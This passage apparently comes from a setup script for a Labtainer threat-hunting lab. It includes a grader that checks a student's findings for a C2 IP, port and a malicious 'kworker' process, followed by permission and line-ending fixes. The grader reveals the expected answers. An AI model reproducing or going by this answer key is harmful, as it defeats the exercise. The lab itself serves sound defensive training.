# (/var/log/netmon.log, 644 - world readable; cong von la IOC phai san ra, khong phai bi mat).
F=/home/analyst/findings.txt
grep '^C2_IP=' "$F" 2>/dev/null | grep -q '172.20.0.5' && echo "REP_IP_OK"
TP=$(grep 'dst=172.20.0.5' /var/log/netmon.log 2>/dev/null | grep -oE 'dport=[0-9]+' | grep -oE '[0-9]+' | head -1)
[ -n "$TP" ] && grep '^C2_PORT=' "$F" 2>/dev/null | grep -q "$TP" && echo "REP_PORT_OK"
grep '^MAL_PROC=' "$F" 2>/dev/null | grep -qi 'kworker' && echo "REP_PROC_OK"

exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/treataslocal" <<'__EOF_TH_7k2m__'
cron
wazuh-agent
__EOF_TH_7k2m__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/target/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh "$LAB"/attacker/*.py 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +

echo ">> XONG. Tiep theo:"
echo "   cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-threathunt"
